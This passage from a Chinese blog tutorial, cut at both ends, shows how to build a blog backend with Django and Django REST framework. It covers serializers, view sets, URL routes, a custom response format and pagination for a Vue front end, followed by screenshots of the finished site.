class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">    list_display = [<span class="string">'title'</span>,<span class="string">'href'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.register(Focus)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FoucusAdmin</span><span class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">    list_display = [<span class="string">'title'</span>,<span class="string">'img'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.register(Friend)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FoucusAdmin</span><span class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">    list_display = [<span class="string">'siteName'</span>,<span class="string">'path'</span>,<span class="string">'desc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.register(Tag)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAdmin</span><span class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">    list_display = [<span class="string">'id'</span>,<span class="string">'tag'</span>]</span><br></pre></td></tr></table></figure><h3 id="3、接口"><a href="#3、接口" class="headerlink" title="3、接口"></a>3、接口</h3><p>前端是Vue模板展示的，所以要为前端Vue提供相应的接口。通过djangorestframework将模型通过restful接口提供是非常easy的。</p><h4 id="1）首先将需要暴露的模型通过序列化类序列化"><a href="#1）首先将需要暴露的模型通过序列化类序列化" class="headerlink" title="1）首先将需要暴露的模型通过序列化类序列化"></a>1）首先将需要暴露的模型通过序列化类序列化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">serializers.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> blog.models <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> serializers</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogCategoryModelSerializer</span><span class="params">(serializers.ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model=BlogCategory</span><br><span class="line">        fields = <span class="string">"__all__"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagModelSerializer</span><span class="params">(serializers.ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = Tag</span><br><span class="line">        fields = <span class="string">"__all__"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogPostModelSerializer</span><span class="params">(serializers.ModelSerializer)</span>:</span></span><br><span class="line">    create_time = serializers.DateTimeField(format=<span class="string">"%Y-%m-%d %H:%M:%S"</span>, required=<span class="literal">False</span>, read_only=<span class="literal">True</span>)</span><br><span class="line">    update_time = serializers.DateTimeField(format=<span class="string">"%Y-%m-%d %H:%M:%S"</span>, required=<span class="literal">False</span>, read_only=<span class="literal">True</span>)</span><br><span class="line">    category_id = serializers.CharField(max_length=<span class="number">32</span>, source=<span class="string">'category.id'</span>)</span><br><span class="line">    pubTime=update_time</span><br><span class="line">    category=BlogCategoryModelSerializer()</span><br><span class="line">    tags=serializers.SerializerMethodField()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多对多，钩子函数序列化,必须是以get_开头的</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_tags</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        tags = obj.tags.all()</span><br><span class="line">        tag = TagModelSerializer(tags, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> tag.data</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model=BlogPost</span><br><span class="line">        fields=<span class="string">"__all__"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SiteModelSerializer</span><span class="params">(serializers.ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = Site</span><br><span class="line">        fields = <span class="string">"__all__"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SocialModelSerializer</span><span class="params">(serializers.ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = Social</span><br><span class="line">        fields = <span class="string">"__all__"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FocusModelSerializer</span><span class="params">(serializers.ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = Focus</span><br><span class="line">        fields = <span class="string">"__all__"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FriendModelSerializer</span><span class="params">(serializers.ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = Friend</span><br><span class="line">        fields = <span class="string">"__all__"</span></span><br></pre></td></tr></table></figure><h4 id="2）将序列化的对象通过视图类提供接口"><a href="#2）将序列化的对象通过视图类提供接口" class="headerlink" title="2）将序列化的对象通过视图类提供接口"></a>2）将序列化的对象通过视图类提供接口</h4><p>custommodelviewset.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> viewsets</span><br><span class="line"><span class="keyword">from</span> common.customresponse <span class="keyword">import</span> CustomResponse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomModelViewSet</span><span class="params">(viewsets.ModelViewSet)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#CreateModelMixin-&gt;create</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        serializer = self.get_serializer(data=request.data)</span><br><span class="line">        serializer.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        self.perform_create(serializer)</span><br><span class="line">        headers = self.get_success_headers(serializer.data)</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=serializer.data, code=<span class="number">201</span>,msg=<span class="string">"OK"</span>, status=status.HTTP_201_CREATED,headers=headers)</span><br><span class="line">    <span class="comment">#ListModelMixin-&gt;list</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        queryset = self.filter_queryset(self.get_queryset())</span><br><span class="line">        page = self.paginate_queryset(queryset)</span><br><span class="line">        <span class="keyword">if</span> page <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            serializer = self.get_serializer(page, many=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span> self.get_paginated_response(serializer.data)</span><br><span class="line"></span><br><span class="line">        serializer = self.get_serializer(queryset, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=serializer.data, code=<span class="number">200</span>, msg=<span class="string">"OK"</span>, status=status.HTTP_200_OK)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#RetrieveModelMixin-&gt;retrieve</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">retrieve</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        instance = self.get_object()</span><br><span class="line">        serializer = self.get_serializer(instance)</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=serializer.data, code=<span class="number">200</span>, msg=<span class="string">"OK"</span>, status=status.HTTP_200_OK)</span><br><span class="line">    <span class="comment">#UpdateModelMixin-&gt;update</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        partial = kwargs.pop(<span class="string">'partial'</span>, <span class="literal">False</span>)</span><br><span class="line">        instance = self.get_object()</span><br><span class="line">        serializer = self.get_serializer(instance, data=request.data, partial=partial)</span><br><span class="line">        serializer.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        self.perform_update(serializer)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> getattr(instance, <span class="string">'_prefetched_objects_cache'</span>, <span class="literal">None</span>):</span><br><span class="line">            <span class="comment"># If 'prefetch_related' has been applied to a queryset, we need to</span></span><br><span class="line">            <span class="comment"># forcibly invalidate the prefetch cache on the instance.</span></span><br><span class="line">            instance._prefetched_objects_cache = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=serializer.data, code=<span class="number">200</span>, msg=<span class="string">"OK"</span>, status=status.HTTP_200_OK)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#DestroyModelMixin-&gt;destroy</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        instance = self.get_object()</span><br><span class="line">        self.perform_destroy(instance)</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=[], code=<span class="number">204</span>, msg=<span class="string">"OK"</span>, status=status.HTTP_204_NO_CONTENT)</span><br></pre></td></tr></table></figure><p>views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="keyword">from</span> django_filters.rest_framework <span class="keyword">import</span> DjangoFilterBackend</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> viewsets, status</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> filters</span><br><span class="line"><span class="keyword">from</span> api.myfilter <span class="keyword">import</span> BlogPostFilter</span><br><span class="line"><span class="keyword">from</span> api.serializers <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> blog.models <span class="keyword">import</span> BlogCategory, BlogPost,Site,Social,Focus,Friend,Tag</span><br><span class="line"><span class="keyword">from</span> api.mypage <span class="keyword">import</span> MyPage</span><br><span class="line"><span class="keyword">from</span> common.custommodelviewset <span class="keyword">import</span> CustomModelViewSet</span><br><span class="line"><span class="keyword">from</span> common.customresponse <span class="keyword">import</span> CustomResponse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogCategoryViewset</span><span class="params">(CustomModelViewSet)</span>:</span></span><br><span class="line">    queryset = BlogCategory.objects.all()</span><br><span class="line">    serializer_class = BlogCategoryModelSerializer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogsView</span><span class="params">(CustomModelViewSet)</span>:</span></span><br><span class="line">    queryset = BlogPost.objects.order_by(<span class="string">'-isTop'</span>,<span class="string">'-update_time'</span>)</span><br><span class="line">    serializer_class = BlogPostModelSerializer</span><br><span class="line">    pagination_class = MyPage</span><br><span class="line">    filter_backends = (DjangoFilterBackend, filters.SearchFilter, filters.OrderingFilter)</span><br><span class="line">    filterset_class = BlogPostFilter</span><br><span class="line">    <span class="comment">#搜索</span></span><br><span class="line">    search_fields=(<span class="string">'title'</span>,)</span><br><span class="line">    <span class="comment">#排序</span></span><br><span class="line">    ordering_fields = (<span class="string">'isTop'</span>, <span class="string">'update_time'</span>)</span><br><span class="line">    <span class="comment">#自定义获取详情接口</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">retrieve</span><span class="params">(self,request,*args, **kwargs)</span>:</span></span><br><span class="line">        instance=self.get_object()</span><br><span class="line">        instance.viewsCount+=<span class="number">1</span></span><br><span class="line">        instance.save()</span><br><span class="line">        serializer=self.get_serializer(instance)</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=serializer.data,code=<span class="number">200</span>,msg=<span class="string">"success"</span>,status=status.HTTP_200_OK)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SiteView</span><span class="params">(CustomModelViewSet)</span>:</span></span><br><span class="line">    queryset = Site.objects.all()</span><br><span class="line">    serializer_class = SiteModelSerializer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SocialView</span><span class="params">(CustomModelViewSet)</span>:</span></span><br><span class="line">    queryset = Social.objects.all()</span><br><span class="line">    serializer_class = SocialModelSerializer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FocusView</span><span class="params">(CustomModelViewSet)</span>:</span></span><br><span class="line">    queryset = Focus.objects.all()</span><br><span class="line">    serializer_class = FocusModelSerializer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FriendView</span><span class="params">(viewsets.ModelViewSet)</span>:</span></span><br><span class="line">    queryset = Friend.objects.all()</span><br><span class="line">    serializer_class = FriendModelSerializer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagView</span><span class="params">(viewsets.ModelViewSet)</span>:</span></span><br><span class="line">    queryset = Tag.objects.all()</span><br><span class="line">    serializer_class = TagModelSerializer</span><br></pre></td></tr></table></figure><h4 id="3）通过路由来实现接口地址和视图的绑定和访问"><a href="#3）通过路由来实现接口地址和视图的绑定和访问" class="headerlink" title="3）通过路由来实现接口地址和视图的绑定和访问"></a>3）通过路由来实现接口地址和视图的绑定和访问</h4><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    :author: XieJava</span></span><br><span class="line"><span class="string">    :url: http://ishareread.com</span></span><br><span class="line"><span class="string">    :copyright: © 2021 XieJava &lt;xiejava@ishareread.com&gt;</span></span><br><span class="line"><span class="string">    :license: MIT, see LICENSE for more details.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> api <span class="keyword">import</span> views</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path,include</span><br><span class="line"><span class="keyword">from</span> rest_framework.routers <span class="keyword">import</span> DefaultRouter</span><br><span class="line">blogcategory_list=views.BlogCategoryViewset.as_view(&#123;<span class="string">'get'</span>:<span class="string">'list'</span>,&#125;)</span><br><span class="line">blogcategory_detail=views.BlogCategoryViewset.as_view(&#123; <span class="string">'get'</span>: <span class="string">'retrieve'</span>,&#125;)</span><br><span class="line">blog_list=views.BlogsView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'list'</span>,&#125;)</span><br><span class="line">blog_detail=views.BlogsView.as_view(&#123; <span class="string">'get'</span>: <span class="string">'retrieve'</span>,&#125;)</span><br><span class="line">site_list=views.SiteView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'list'</span>,&#125;)</span><br><span class="line">site_detail=views.SiteView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'retrieve'</span>,&#125;)</span><br><span class="line">social_list=views.SocialView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'list'</span>,&#125;)</span><br><span class="line">social_detail=views.SocialView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'retrieve'</span>,&#125;)</span><br><span class="line">focus_list=views.FocusView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'list'</span>,&#125;)</span><br><span class="line">focus_detail=views.FocusView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'retrieve'</span>&#125;)</span><br><span class="line">friend_list=views.FriendView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'list'</span>,&#125;)</span><br><span class="line">friend_detail=views.FriendView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'retrieve'</span>&#125;)</span><br><span class="line">tags_list=views.TagView.as_view(&#123;<span class="string">'get'</span>:<span class="string">'list'</span>,&#125;)</span><br><span class="line"><span class="comment"># router=DefaultRouter()</span></span><br><span class="line"><span class="comment"># router.register('blogs',views.BlogsView)</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'category/'</span>,blogcategory_list),</span><br><span class="line">    path(<span class="string">'category/&lt;pk&gt;/'</span>,blogcategory_detail),</span><br><span class="line">    path(<span class="string">'post/list'</span>,blog_list),</span><br><span class="line">    path(<span class="string">'post/&lt;pk&gt;'</span>,blog_detail),</span><br><span class="line">    path(<span class="string">'social/'</span>,social_list),</span><br><span class="line">    path(<span class="string">'site/&lt;pk&gt;'</span>,site_detail),</span><br><span class="line">    path(<span class="string">'focus/list'</span>,focus_list),</span><br><span class="line">    path(<span class="string">'comment/'</span>,blog_list),</span><br><span class="line">    path(<span class="string">'friend/'</span>,friend_list),</span><br><span class="line">    path(<span class="string">'tags/'</span>,tags_list),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="4）自定义接口返回格式"><a href="#4）自定义接口返回格式" class="headerlink" title="4）自定义接口返回格式"></a>4）自定义接口返回格式</h4><p>接口需要根据Glog定义的格式进行定义和返回，这里就需要自定义接口返回格式。<br>具体实现参见：<a href="https://xiejava.blog.csdn.net/article/details/125773730" target="_blank" rel="noopener">https://xiejava.blog.csdn.net/article/details/125773730</a><br>–自定义返回响应类customresponse.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework.serializers <span class="keyword">import</span> Serializer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomResponse</span><span class="params">(Response)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,data=None,code=None,msg=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 status=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 template_name=None, headers=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 exception=False, content_type=None,**kwargs)</span>:</span></span><br><span class="line">        super().__init__(<span class="literal">None</span>, status=status)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> isinstance(data, Serializer):</span><br><span class="line">            msg = (</span><br><span class="line">                <span class="string">'You passed a Serializer instance as data, but '</span></span><br><span class="line">                <span class="string">'probably meant to pass serialized `.data` or '</span></span><br><span class="line">                <span class="string">'`.error`. representation.'</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">raise</span> AssertionError(msg)</span><br><span class="line">        self.data=&#123;<span class="string">'code'</span>:code,<span class="string">'msg'</span>:msg,<span class="string">'data'</span>:data&#125;</span><br><span class="line">        self.data.update(kwargs)</span><br><span class="line">        self.template_name=template_name</span><br><span class="line">        self.exception=exception</span><br><span class="line">        self.content_type=content_type</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> headers:</span><br><span class="line">            <span class="keyword">for</span> name, value <span class="keyword">in</span> headers.items():</span><br><span class="line">                self[name] = value</span><br></pre></td></tr></table></figure><p>–翻页实现类mypage.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"><span class="keyword">from</span> rest_framework.pagination <span class="keyword">import</span> PageNumberPagination</span><br><span class="line"><span class="keyword">from</span> common.customresponse <span class="keyword">import</span> CustomResponse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPage</span><span class="params">(PageNumberPagination)</span>:</span></span><br><span class="line">    page_size = <span class="number">8</span> <span class="comment">#每页显示数量</span></span><br><span class="line">    max_page_size = <span class="number">50</span> <span class="comment">#每页最大显示数量。</span></span><br><span class="line">    page_size_query_param = <span class="string">'size'</span> <span class="comment">#每页数量的参数名称</span></span><br><span class="line">    page_query_param = <span class="string">'page'</span>  <span class="comment">#页码的参数名称</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#自定义分页器的返回参数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_paginated_response</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        ret_data = dict()</span><br><span class="line">        ret_data[<span class="string">'items'</span>] = data</span><br><span class="line">        <span class="comment"># 加入自定义分页信息</span></span><br><span class="line">        ret_data[<span class="string">'total'</span>] = self.page.paginator.count</span><br><span class="line">        ret_data[<span class="string">'hasNextPage'</span>] = self.get_next_link()</span><br><span class="line">        ret_data[<span class="string">'size'</span>] = self.page_size</span><br><span class="line">        ret_data[<span class="string">'page'</span>] = self.page.number</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(data=ret_data,code=<span class="number">200</span>,msg=<span class="string">"OK"</span>,status=status.HTTP_200_OK)</span><br></pre></td></tr></table></figure><p>全部代码：<br>后台代码：<a href="https://gitee.com/xiejava/ishareblog" target="_blank" rel="noopener">https://gitee.com/xiejava/ishareblog</a><br>前台代码：<a href="https://gitee.com/xiejava/Gblog" target="_blank" rel="noopener">https://gitee.com/xiejava/Gblog</a></p><h2 id="四、效果"><a href="#四、效果" class="headerlink" title="四、效果"></a>四、效果</h2><h3 id="1、后台管理"><a href="#1、后台管理" class="headerlink" title="1、后台管理"></a>1、后台管理</h3><p>管理界面<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86.png" alt="管理界面"><br>博客文章列表<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0%E5%88%97%E8%A1%A8.png" alt="博客文章列表"><br>文章内容编辑，支持markdown<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E6%96%87%E7%AB%A0%E5%86%85%E5%AE%B9markdown%E7%BC%96%E8%BE%91.png" alt="文章内容编辑，支持markdown"><br>分类管理<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E5%88%86%E7%B1%BB%E7%AE%A1%E7%90%86.png" alt="文章分类"><br>标签管理<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86.png" alt="标签管理"><br>社交信息<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E7%A4%BE%E4%BA%A4%E4%BF%A1%E6%81%AF.png" alt="社交信息"></p><h3 id="2、接口"><a href="#2、接口" class="headerlink" title="2、接口"></a>2、接口</h3><p>接口清单<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E6%8E%A5%E5%8F%A3%E6%B8%85%E5%8D%95.png" alt="接口清单"></p><p>文章列表接口，支持翻页</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E6%96%87%E7%AB%A0%E5%88%97%E8%A1%A8%E6%8E%A5%E5%8F%A3.png" alt="文章列表接口"></p><p>文章详情接口<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E6%96%87%E7%AB%A0%E8%AF%A6%E6%83%85%E6%8E%A5%E5%8F%A3.png" alt="文章详情接口"></p><h3 id="3、前台展现"><a href="#3、前台展现" class="headerlink" title="3、前台展现"></a>3、前台展现</h3><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E5%89%8D%E5%8F%B0%E5%B1%95%E7%8E%B0.png" alt="前台展现"></p><p>文章列表<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E6%96%87%E7%AB%A0%E5%88%97%E8%A1%A8.png" alt="文章列表"></p><p>文章详情，支持markdown显示及目录<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E6%96%87%E7%AB%A0%E8%AF%A6%E6%83%85.png" alt="文章详情"></p><p>社交信息<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E7%A4%BE%E4%BA%A4%E4%BF%A1%E6%81%AF-%E5%89%8D%E5%8F%B0.png" alt="社交信息"></p><p>博客效果地址：<a href="http://blog.ishareread.com" target="_blank" rel="noopener">http://blog.ishareread.com</a></p><p>后续考虑<br>1、django原生admin的管理界面还是简陋了一点，后续可能会用其他管理界面的UI给换掉<br>2、现在有了一个hexo的博客了，后续可能会考虑实现hexo生成的博客内容直接同步到django的博客，或者django博客编辑的内容直接生成hexo的.md文件<br>有兴趣的话可以关注本博客</p><hr><p>博客：<a href="http://xiejava.ishareread.com" target="_blank" 